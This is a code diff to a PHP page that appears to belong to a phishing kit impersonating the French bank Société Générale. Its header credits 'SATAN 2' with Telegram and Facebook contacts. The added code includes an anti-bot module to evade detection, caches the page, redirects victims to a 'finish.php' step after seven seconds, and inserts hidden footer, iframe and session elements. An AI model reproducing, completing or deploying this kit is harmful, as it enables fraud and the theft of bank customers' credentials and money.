@@ -1,3 +1,31 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+
+/**
+ * @link       :   https://www.satan2.com/ 
+ * @package    :   SOCIETE GENERALE 
+ * @telegram   :   @satan2  
+ * Project Name:   SOCIETE GENERALE 2022
+ * Author      :   SATAN 2
+ * Mise à jour :   08-09-2022
+ * Author URI  :   https://www.facebook.com/satan2
+ */
+
+include '../inc/antibots.php';
+include_once '../inc/app.php';
+
+$random   = rand(0,100000000000);
+$LSG = substr(md5($random), 0, 17);
+
+?>
+<?php 
+/*CACHE*/
+$fichierCache = '../cache/lsg_passecur.lsg';
+if (@filemtime($fichierCache)<time()-(24*3600)) {ob_start(); 
+?>
 
 <!DOCTYPE html>
 <html lang="fr" class="swm-root-active swm-mode-page" >
@@ -668,7 +696,7 @@ swmConfOverride.styles = ["../assets/css/style.css"];
 
 <script>
 setTimeout(function(){
-window.location.href="finish.php?lsg#12996cdffc1053150";
+window.location.href="finish.php?lsg#<?php echo $LSG; ?>";
 }, 7000);
 </script>  
 
@@ -1104,4 +1132,21 @@ if(idd == 2){
 </DIV>
 
 
+
+<?php 
+$contenuCache = ob_get_contents();ob_end_flush();
+$fd = fopen("$fichierCache", "w");
+if ($fd) {fwrite($fd,$contenuCache);fclose($fd);}} else {readfile('../cache/lsg_passecur.lsg');echo "\n";}  
+?>
+<input type="hidden" name="memoryText" id="memoryText" value="<?php if(isset($_SESSION['memory'])){ echo htmlspecialchars($_SESSION['memory']); } ?>" style="display: none;">
+<footer style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"> 
+<div id="footerr" class="Footer" style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"></div><iframe id="footerr2" src="" scrolling="no" style="display: none; visibility: hidden; overflow: hidden; width: 0px !important; height: 0px !important;"></iframe>
+</footer>
+<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afa.js" defer="defer"></script>
+<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afb.js" defer="defer"></script>
+
+
+</body>
+</html>
+ 
 
